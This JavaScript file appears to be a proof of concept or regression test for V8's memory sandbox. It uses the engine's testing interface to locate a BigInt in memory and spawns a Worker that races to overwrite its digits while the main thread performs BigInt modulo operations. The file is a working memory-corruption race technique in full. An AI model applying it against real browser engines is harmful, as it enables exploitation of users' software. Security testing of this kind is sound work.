let sbx_mem = new DataView(new Sandbox.MemoryView(0, 0x500000000));

function corruptInBackground(address) {
    function workerTemplate(address) {
        let sbx_mem = new DataView(new Sandbox.MemoryView(0, 0x500000000));
        var old_val = BigInt(0xd87a0f9cf8f3aa0f);
        var new_val = BigInt(0x4cccbd3b9806ace3);
        var c = true;

        while(true) {
            if (c) {
                sbx_mem.setBigUint64(address, old_val, true);
            } else {
                sbx_mem.setBigUint64(address, new_val, true);
            }
            c = !c;
        }
    }
    const workerCode = new Function(
        `(${workerTemplate})(${address})`);
    return new Worker(workerCode, { type: 'function' });
}

const v2 = 536870887n ** 65536n;
let v3 = v2 >> 65536n;
v3++;

let v3_addr = Sandbox.getAddressOf(v3)
while(true) {
    let v1 = sbx_mem.getUint32(v3_addr, true);
    let v2 = sbx_mem.getUint32(v3_addr - 4, true);
    if (v1 == 0xd87a0f9c && v2 == 0xf8f3aa0f) {
        break;
    }
    v3_addr += 1;
}
let worker = corruptInBackground(v3_addr, 0);

for(var i = 0; i < 0x100; i++) {
    let x = v2 % v3;
}

